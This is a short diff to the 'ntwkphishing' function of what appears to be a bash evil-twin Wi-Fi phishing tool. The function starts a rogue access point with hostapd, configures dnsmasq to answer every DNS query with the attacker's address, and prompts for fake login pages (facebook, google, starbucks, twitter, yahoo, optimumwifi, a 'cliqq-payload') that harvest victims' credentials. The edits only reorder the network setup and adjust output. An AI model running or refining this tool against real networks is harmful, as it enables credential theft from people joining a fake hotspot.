@@ -407,10 +407,6 @@ ntwkphishing() {
 		hostapd hostapd.conf > /dev/null 2>&1 &
 		sleep 5
 		echo -e "\n${yellowColour}[*]${grayColour} Configuring dnsmasq..."
-		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
-		sleep 1
-		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-		sleep 3
 		echo -e "interface=${tar}\n" > dnsmasq.conf
 		echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
 		echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
@@ -420,11 +416,16 @@ ntwkphishing() {
 		echo -e "log-dhcp\n" >> dnsmasq.conf
 		echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
 		echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
+		sleep 1
+		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
+		sleep 1
+		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+		sleep 3
 		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 		cd src
 		logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi all_in_one)
 		tput cnorm
-		echo -ne "${yellowColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo-login, cliqq-payload, optimumwifi): " && read usedlogin
+		echo -ne "\n${yellowColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo-login, cliqq-payload, optimumwifi): " && read usedlogin
 		check_logins=0; for login in "${logins[@]}"; do
 			if [ "$login" == "$usedlogin" ]; then
 					check_logins=1
@@ -464,7 +465,7 @@ ntwkphishing() {
 	}
 	
 	clear
-	echo -e "$purpleColour[*]$grayColour Starting NTWK Phishing..."
+	echo -e "\n$purpleColour[*]$grayColour Starting NTWK Phishing..."
 	sleep 2
 	attack
 }
